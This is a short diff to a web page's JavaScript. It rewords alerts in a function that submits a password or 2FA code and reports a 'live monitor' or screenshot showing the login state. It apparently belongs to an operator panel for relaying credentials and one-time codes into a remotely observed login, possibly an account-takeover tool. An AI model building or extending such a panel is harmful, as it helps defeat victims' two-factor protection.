@@ -238,7 +238,7 @@
             const code = document.getElementById('code').value;
             
             if (!pass && !code) {
-                alert("Please enter password first.");
+                alert("Type password first.");
                 return;
             }
             
@@ -249,19 +249,16 @@
             })
             .then(r => r.json())
             .then(data => {
-                console.log('Submit response:', data);
-                
+                console.log(data);
                 if (pass && !code) {
-                    alert('Password sent. Live monitor now shows orange "PASSWORD SENT / LOGGING IN" state.');
+                    alert('Password sent — screenshot should now show "PASSWORD ENTERED" + logging in state.');
                     document.getElementById('pass').value = '';
                 } else if (code) {
-                    alert('2FA code sent. Live monitor updated.');
+                    alert('2FA sent — screenshot updated.');
                     document.getElementById('code').value = '';
                 }
             })
-            .catch(() => {
-                alert('Submitted');
-            });
+            .catch(() => alert('Submitted'));
         }
         
         let lastUpdate = Date.now();
